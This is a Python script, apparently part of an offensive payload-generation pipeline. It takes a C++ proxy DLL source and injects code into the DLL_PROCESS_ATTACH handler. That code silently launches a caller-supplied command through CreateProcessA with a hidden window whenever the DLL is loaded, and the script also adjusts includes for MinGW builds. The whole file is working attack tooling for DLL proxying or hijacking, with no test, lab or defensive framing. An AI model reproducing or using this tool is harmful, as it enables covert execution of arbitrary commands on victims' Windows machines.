#!/usr/bin/env python3
# preprocessors/inject_dll_proxy_command.py
import sys
import json
import re

def main():
    args = json.load(sys.stdin)
    cpp_file_path = args['cpp_content'].strip()
    command = args['command']
    
    # Read the C++ file content
    try:
        with open(cpp_file_path, 'r') as f:
            cpp_content = f.read()
    except FileNotFoundError:
        print(json.dumps({'error': f'Could not find file: {cpp_file_path}'}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({'error': f'Error reading file: {str(e)}'}), file=sys.stderr)
        sys.exit(1)
    
    # Escape the command for C++ string literal
    # Replace backslashes first, then quotes
    escaped_command = command.replace('\\', '\\\\').replace('"', '\\"')
    
    # The code to inject
    injection_code = f'''case DLL_PROCESS_ATTACH:
        {{
            STARTUPINFOA si = {{ 0 }};
            PROCESS_INFORMATION pi = {{ 0 }};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            CreateProcessA(
                NULL,
                (LPSTR)"{escaped_command}",
                NULL,
                NULL,
                FALSE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );
        }}
            break;'''
    
    # Find and replace the DLL_PROCESS_ATTACH case
    # Pattern to match: case DLL_PROCESS_ATTACH: followed by break; (with any whitespace)
    # Use DOTALL flag to match newlines
    pattern = r'case\s+DLL_PROCESS_ATTACH\s*:\s+break\s*;'
    
    if re.search(pattern, cpp_content, re.DOTALL):
        modified_content = re.sub(pattern, injection_code, cpp_content, flags=re.DOTALL)
    else:
        print(json.dumps({'error': 'Could not find DLL_PROCESS_ATTACH case statement'}), file=sys.stderr)
        sys.exit(1)
    
    # Fix case-sensitive includes for MinGW (Windows.h vs windows.h)
    modified_content = re.sub(r'#include\s+<Windows\.h>', '#include <windows.h>', modified_content)
    
    # Output the modified C++ code
    print(modified_content)

if __name__ == "__main__":
    main()
